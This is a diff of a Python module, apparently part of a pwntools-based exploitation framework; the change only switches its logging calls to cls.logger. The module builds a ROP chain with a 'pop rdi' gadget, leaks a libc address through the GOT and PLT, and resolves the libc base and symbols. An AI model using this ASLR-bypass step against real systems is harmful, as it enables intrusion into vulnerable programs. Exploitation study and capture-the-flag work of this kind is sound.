@@ -1,7 +1,6 @@
 import tempfile
 import typing
 from typing import Optional
-from loguru import logger
 from pwnlib.elf import ELF
 
 from abstract.module import AbstractModule
@@ -18,20 +17,20 @@ class GetLibcAddress(AbstractModule):
     @classmethod
     def execute(cls, target: TargetBase, target_functions: Optional[typing.List[str]] = None, print_function: Optional[str] = None,
                 handler: typing.Callable = None, *args, **kwargs) -> Optional:
-        logger.info(f"Running {cls.__name__} module")
-        logger.info("Looking for a print function")
+        cls.logger.info(f"Running {cls.__name__} module")
+        cls.logger.info("Looking for a print function")
         if not print_function:
             print_function = cls.DEFAULT_PRINT_FUNCTIONS
         result = FindFunction.execute(target, print_function, Method.PLT)
         if not result:
-            logger.critical(f"Failed to get a print function")
+            cls.logger.critical(f"Failed to get a print function")
             return None
         print_function_name, print_function_address = result
         if not target_functions:
             target_functions = cls.DEFAULT_PRINT_FUNCTIONS
         result = FindFunction.execute(target, target_functions, Method.GOT)
         if not result:
-            logger.critical(f"Failed to find the target function")
+            cls.logger.critical(f"Failed to find the target function")
             return None
         target_function_name, target_function_address = result
         pop_rdi = target.rop.find_gadget(['pop rdi', 'ret']).address + target.file.address
@@ -44,7 +43,7 @@ class GetLibcAddress(AbstractModule):
         )
         payload = target.create_payload(rop_chain)
 
-        logger.info(f"Sending payload. Payload size = {hex(len(payload))}")
+        cls.logger.info(f"Sending payload. Payload size = {hex(len(payload))}")
         if handler:
             handler(target, payload)
         else:
@@ -52,10 +51,10 @@ class GetLibcAddress(AbstractModule):
         data = target.process.recvline()
         data = data.strip(b'\n')
         if len(data) > 8:
-            logger.critical("Unexpected number of bytes received")
+            cls.logger.critical("Unexpected number of bytes received")
             return None
         result = u64(data.ljust(8, b'\0'))
-        logger.success(f"Leaked libc address: {target_function_name}@{hex(result)}")
+        cls.logger.success(f"Leaked libc address: {target_function_name}@{hex(result)}")
         return result
 
     @classmethod
@@ -67,16 +66,16 @@ class GetLibcAddress(AbstractModule):
         else:
             possible_libs = LocalLibcFinder.find_lib(functions, custom_filter)
             if not possible_libs:
-                logger.critical(f"Failed to find libc")
+                cls.logger.critical(f"Failed to find libc")
                 return False
             lib_name, (data, base) = possible_libs.popitem()
 
         tmp_file = tempfile.NamedTemporaryFile('wb')
-        logger.info(f"Saving {lib_name} to {tmp_file.name}")
+        cls.logger.info(f"Saving {lib_name} to {tmp_file.name}")
         tmp_file.write(data)
         tmp_file.flush()
-        logger.info(f"Parsing libc symbols...")
+        cls.logger.info(f"Parsing libc symbols...")
         target.libc = ELF(tmp_file.name)
         target.libc.address = base
-        logger.info(f"Using library: {lib_name}@{hex(base)}")
+        cls.logger.info(f"Using library: {lib_name}@{hex(base)}")
         return True
